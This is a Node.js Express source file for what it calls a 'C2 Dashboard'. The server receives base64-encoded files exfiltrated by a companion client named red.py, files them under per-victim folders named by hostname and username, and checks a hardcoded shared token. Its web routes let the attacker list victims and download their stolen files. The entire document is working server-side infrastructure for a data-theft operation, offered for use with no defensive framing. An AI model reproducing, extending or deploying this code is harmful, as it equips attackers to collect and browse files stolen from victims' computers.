const express = require("express");       // web server framework
const fs = require("fs").promises;        // async file system
const path = require("path");             // safe path handling
const cors = require("cors");             // allow cross-origin requests

const app = express();
app.use(cors());                                      // accept requests from any machine
app.use(express.json({ limit: "50mb" }));             // parse JSON, allow up to 50mb

const VICTIMS_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH 
  ? path.join(process.env.RAILWAY_VOLUME_MOUNT_PATH, "victims")
  : path.join(__dirname, "victims");  // folder to store all victim data
const SECRET_TOKEN = "qutmess";                       // shared secret between red.py and server

// create victims folder on startup if it doesn't exist
(async () => {
  try { await fs.mkdir(VICTIMS_DIR); } catch (e) {}
})();

// root dashboard — attacker opens this in browser to see all victims
app.get("/", async (req, res) => {
  if (req.headers.authorization !== "Bearer qutmess")
    return res.status(403).send("Unauthorized");
  const victims = await fs.readdir(VICTIMS_DIR);
  res.send(`
    <h2>C2 Dashboard — ${victims.length} victims</h2>
    <ul>${victims.map(v => `<li><a href="/victim/${v}">${v}</a></li>`).join("")}</ul>
  `);
});
// receive exfiltrated file from red.py
app.post("/send", async (req, res) => {
  const { hostname, username, file, token } = req.body;

  // verify token — reject anyone who is not red.py
  if (token !== SECRET_TOKEN) return res.status(403).json({ error: "Unauthorized" });

    console.log(`[+] ${req.ip} — ${hostname}_${username}`); // ← here

  // reject if no file was sent
  if (!file) return res.status(400).json({ error: "No file" });

  // sanitize folder name — prevent directory traversal attack
  const safeFolder = path.basename(`${hostname}_${username}`);

  // sanitize file name — remove dangerous characters
  const safeFileName = file.name.replace(/\.\./g, "").replace(/[<>:"|?*]/g, "_");

  // full path where file will be saved
  const victimDir = path.join(VICTIMS_DIR, safeFolder);
  const filePath  = path.join(victimDir, safeFileName);

  try {
    // create victim subfolder if it doesn't exist (recursive handles nested paths)
    await fs.mkdir(path.dirname(filePath), { recursive: true });

    // decode base64 content and save as real file
    await fs.writeFile(filePath, Buffer.from(file.content, "base64"));

    console.log(`[+] ${safeFolder} — saved ${safeFileName}`);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Write failed" });
  }
});

// browse a specific victim's files
app.get("/victim/:id", async (req, res) => {
  const safeId    = path.basename(req.params.id);           // sanitize victim id
  const victimDir = path.join(VICTIMS_DIR, safeId);
  try {
    const files = await fs.readdir(victimDir);
    res.send(`
      <h2>Victim: ${safeId}</h2>
      <ul>${files.map(f => `<li><a href="/victim/${safeId}/${f}">${f}</a></li>`).join("")}</ul>
    `);
  } catch (e) { res.status(404).send("Not found"); }
});

// download a specific file from a victim
app.get("/victim/:id/:file", async (req, res) => {
  const filePath = path.join(VICTIMS_DIR, path.basename(req.params.id), req.params.file);
  res.download(filePath);   // triggers file download in browser
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`C2 running on port ${PORT}`));
